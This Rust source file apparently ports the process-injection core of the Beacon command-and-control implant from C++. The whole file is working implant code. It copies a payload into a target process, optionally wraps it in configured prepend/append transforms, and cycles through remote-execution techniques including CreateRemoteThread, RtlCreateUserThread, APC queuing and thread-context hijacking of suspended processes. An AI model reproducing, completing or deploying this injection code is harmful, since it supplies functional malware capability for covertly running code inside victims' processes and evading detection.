//! Port of src/inject.cpp — the master tree for Beacon's process injection
//! logic (inject_process_execute, __inject_process_logic,
//! populate_inject_context, inject_process_logic).
//!
//! This module owns the `InjectContext` struct and the PI_EXEC_* /
//! INJECT_ARCH_* constants, and re-exports every injection technique from
//! the sibling inject_*.rs modules so `crate::inject::*` is the single
//! entry point (the C++ spread these across inject.cpp + inject_*.cpp).

use crate::bformat::bformat_init;
use crate::callback::post_error_dd;
use crate::elevate::is_x64;
use crate::parse::DataP;
use crate::settings::setting_ptr;
use std::ffi::c_void;
use windows_sys::Win32::Foundation::GetLastError;
use windows_sys::Win32::System::Threading::{GetCurrentProcessId, PROCESS_INFORMATION};

pub use crate::inject_apcthread::{inject_via_apcthread, inject_via_apcthread_targeted};
pub use crate::inject_createthread::{inject_via_createthread, inject_via_remotethread};
pub use crate::inject_hinted::inject_with_hinted_func;
pub use crate::inject_mirror::{finalize_memory_permissions, local_mirror_data, remote_mirror_data};
pub use crate::inject_rtlcreateuserthread::inject_via_createuserthread;
pub use crate::inject_rtlcreateuserthread_wow64::inject_via_remotethread_wow64;
pub use crate::inject_setthreadcontext::inject_via_resumethread;
pub use crate::inject_smart::setup_smart_inject;

use crate::beacon::{
    SETTING_PROCINJ_EXECUTE, SETTING_PROCINJ_TRANSFORM_X64, SETTING_PROCINJ_TRANSFORM_X86,
};

/// PI_EXEC_* technique codes from inject.h.
pub const PI_EXEC_FAIL: u32 = 0x0;
pub const PI_EXEC_CREATETHREAD: u32 = 0x1;
pub const PI_EXEC_SETTHREADCONTEXT: u32 = 0x2;
pub const PI_EXEC_CREATEREMOTETHREAD: u32 = 0x3;
pub const PI_EXEC_RTLCREATEUSERTHREAD: u32 = 0x4;
pub const PI_EXEC_NTQUEUEAPCTHREAD: u32 = 0x5;
pub const PI_EXEC_CREATETHREAD_F: u32 = 0x6;
pub const PI_EXEC_CREATEREMOTETHREAD_F: u32 = 0x7;
pub const PI_EXEC_NTQUEUEAPCTHREAD_S: u32 = 0x8;

/// Target/current architecture codes from inject.h.
pub const INJECT_ARCH_X86: u8 = 0;
pub const INJECT_ARCH_X64: u8 = 1;

/// Process injection context (INJECTCONTEXT).
#[derive(Clone)]
pub struct InjectContext {
    pub h_process: isize,
    pub h_thread: isize,
    pub pid: u32,
    pub target_arch: u8,
    pub my_arch: u8,
    pub same_arch: bool,
    pub same_pid: bool,
    pub is_suspended: bool,
}

/// Walk the process inject execute options and try each technique
/// (inject_process_execute). `ptr` points at the mirrored data and `offset`
/// is the location of the function to call inside of it.
fn inject_process_execute(context: &mut InjectContext, ptr: *mut u8, offset: i32, parameter: *mut c_void) -> bool {
    /* 128 is the FIXED size of this field */
    let mut options = [0u8; 128];
    if let Some(opts) = setting_ptr(SETTING_PROCINJ_EXECUTE) {
        let n = opts.len().min(128);
        options[..n].copy_from_slice(&opts[..n]);
    }
    let mut parser = DataP::init(&mut options);

    // The start address is the same at every call site in the C switch.
    let start = unsafe { ptr.offset(offset as isize) } as *mut c_void;

    /* walk our options */
    loop {
        let opcode = parser.data_byte();

        match opcode {
            /* automatic failure, because we're at the end of our options */
            PI_EXEC_FAIL => return false,

            /* try to use CreateThread (works current process inject only */
            PI_EXEC_CREATETHREAD => {
                if context.same_pid && inject_via_createthread(context.h_process, context.pid, start, parameter) {
                    return true;
                }
            }

            /* try to use SetThreadContext/ResumeThread to execute our stuff */
            PI_EXEC_SETTHREADCONTEXT => {
                if context.is_suspended && inject_via_resumethread(context, start, parameter) {
                    return true;
                }
            }

            /* try to use CreateRemoteThread (the Rust port targets x64, the _M_X64 branch) */
            PI_EXEC_CREATEREMOTETHREAD => {
                if inject_via_remotethread(context.h_process, start, parameter) {
                    return true;
                }
            }

            /* try to use RtlCreateUserThread (the Rust port targets x64, the _M_X64 branch) */
            PI_EXEC_RTLCREATEUSERTHREAD => {
                if inject_via_createuserthread(context.h_process, start, parameter) {
                    return true;
                }
            }

            /* try NtQueueApcThread against a remote process that is not suspended */
            PI_EXEC_NTQUEUEAPCTHREAD => {
                if !(context.same_pid || !context.same_arch || context.is_suspended)
                    && inject_via_apcthread(context, start, parameter)
                {
                    return true;
                }
            }

            /* CreateThread with hint */
            PI_EXEC_CREATETHREAD_F => {
                let funcoff = parser.data_short();
                // Copy out of the parser: the slices are not NUL terminated
                // and we need them owned to pass to GetModuleHandleA/GetProcAddress.
                let module = parser.data_string_asciiz().unwrap_or(&[]).to_vec();
                let function = parser.data_string_asciiz().unwrap_or(&[]).to_vec();

                if context.same_pid
                    && inject_with_hinted_func(opcode, context.h_process, start, parameter, &module, &function, funcoff as u32)
                {
                    return true;
                }
            }

            /* CreateRemoteThread with hint */
            PI_EXEC_CREATEREMOTETHREAD_F => {
                let funcoff = parser.data_short();
                let module = parser.data_string_asciiz().unwrap_or(&[]).to_vec();
                let function = parser.data_string_asciiz().unwrap_or(&[]).to_vec();

                if context.same_arch
                    && inject_with_hinted_func(opcode, context.h_process, start, parameter, &module, &function, funcoff as u32)
                {
                    return true;
                }
            }

            /* try NtQueueApcThread against a suspended process */
            PI_EXEC_NTQUEUEAPCTHREAD_S => {
                if context.is_suspended
                    && context.same_arch
                    && inject_via_apcthread_targeted(context, start, parameter)
                {
                    return true;
                }
            }

            _ => {}
        }
    }
}

/// Mirror the data into the target process, then run the execute options
/// against it (__inject_process_logic).
fn __inject_process_logic(context: &mut InjectContext, buffer: &[u8], length: usize, offset: i32, parameter: *mut c_void) {
    /* mirror the data */
    let ptr = if context.same_pid {
        local_mirror_data(buffer, length)
    } else {
        remote_mirror_data(context, buffer, length)
    };

    if ptr.is_null() {
        return;
    }

    /* call our logic to execute code */
    if inject_process_execute(context, ptr, offset, parameter) {
        return; /* TODO: the allocated memory is lost as well as the thread handle. */
    }

    /* post an error staging PI failed... not 0x20 though */
    post_error_dd(0x48, context.pid as i32, unsafe { GetLastError() } as i32);
}

/// Populate an inject context object (populate_inject_context). Exists
/// because several places in the inject code figure out these same questions
/// (again and again), sometimes with different ways of doing it.
fn populate_inject_context(context: &mut InjectContext, pi: *mut PROCESS_INFORMATION, h_process: isize, pid: u32) {
    context.h_process = h_process;
    context.pid = pid;
    context.my_arch = if is_x64() { INJECT_ARCH_X64 } else { INJECT_ARCH_X86 };
    context.target_arch = if is_x64_process(h_process) { INJECT_ARCH_X64 } else { INJECT_ARCH_X86 };
    context.same_arch = context.target_arch == context.my_arch;
    context.same_pid = pid == unsafe { GetCurrentProcessId() };

    if !pi.is_null() {
        unsafe {
            context.is_suspended = true;
            context.h_thread = (*pi).hThread as isize;
        }
    } else {
        context.is_suspended = false;
        context.h_thread = 0;
    }
}

/// Check if a process is x64 or not (delegates to crate::ps).
pub fn is_x64_process(process: isize) -> bool {
    crate::ps::is_x64_process(process)
}

/// Handle our transforms on buffer (inject_process_logic).
///
/// `pi` is the PROCESS_INFORMATION of a spawned process, or NULL when this
/// is not a spawned process eligible for hollowing techniques. `buffer` is
/// the data to inject (assumed to live in RX pages in the remote process);
/// it *will* always be mirrored so page-permission and buffer-availability
/// assumptions hold. `offset` is the location of the function to call inside
/// the mirrored data; `parameter`/`plen` is a remote data blob (already
/// mirrored) to pass as the parameter.
pub fn inject_process_logic(
    pi: *mut c_void,
    h_process: isize,
    pid: u32,
    buffer: &[u8],
    length: usize,
    offset: i32,
    parameter: *mut c_void,
    plen: usize,
) {
    // Guard against callers that pass a length larger than the slice; the C
    // code would read out of bounds. Valid callers always pass length == len.
    let length = length.min(buffer.len());

    let mut context = InjectContext {
        h_process: 0,
        h_thread: 0,
        pid: 0,
        target_arch: 0,
        my_arch: 0,
        same_arch: false,
        same_pid: false,
        is_suspended: false,
    };

    /* populate our context to avoid the need for other functions to figure out the same crap */
    populate_inject_context(&mut context, pi as *mut PROCESS_INFORMATION, h_process, pid);

    /* if we're a smart inject DLL, act on it */
    setup_smart_inject(&mut context, buffer, length);

    /* figure out which transform we want to apply */
    let field = if context.target_arch == INJECT_ARCH_X64 {
        SETTING_PROCINJ_TRANSFORM_X64
    } else {
        SETTING_PROCINJ_TRANSFORM_X86
    };

    /* alrighty, let's get these values (256 is the FIXED size of this field) */
    let mut transform = [0u8; 256];
    if let Some(t) = setting_ptr(field) {
        let n = t.len().min(256);
        transform[..n].copy_from_slice(&t[..n]);
    }
    let mut parser = DataP::init(&mut transform);
    let prependl = parser.data_int() as usize;
    // Copy out of the parser so we can keep both prepend/append around.
    let prepend = parser.data_ptr(prependl).unwrap_or(&[]).to_vec();
    let appendl = parser.data_int() as usize;
    let append = parser.data_ptr(appendl).unwrap_or(&[]).to_vec();

    /* handle copying our parameter to the remote process, please */
    let rparameter: *mut u8 = if plen > 0 {
        let pslice = unsafe { std::slice::from_raw_parts(parameter as *const u8, plen) };
        remote_mirror_data(&mut context, pslice, plen)
    } else {
        std::ptr::null_mut()
    };

    /* easiest case, nothing needs to happen. Pass the data on as needed */
    if prependl == 0 && appendl == 0 {
        __inject_process_logic(&mut context, &buffer[..length], length, offset, rparameter as *mut c_void);
        return;
    }

    /* okie, let's setup our builder and get this moving */
    let mut tbuffer = bformat_init(appendl + prependl + length + 16);
    tbuffer.bformat_copy(&prepend);
    tbuffer.bformat_copy(&buffer[..length]);
    tbuffer.bformat_copy(&append);
    let offset = offset + prependl as i32;

    /* kick off our process inject call */
    __inject_process_logic(&mut context, tbuffer.bformat_string(), tbuffer.bformat_length(), offset, rparameter as *mut c_void);

    /* free everything */
    tbuffer.free();
}
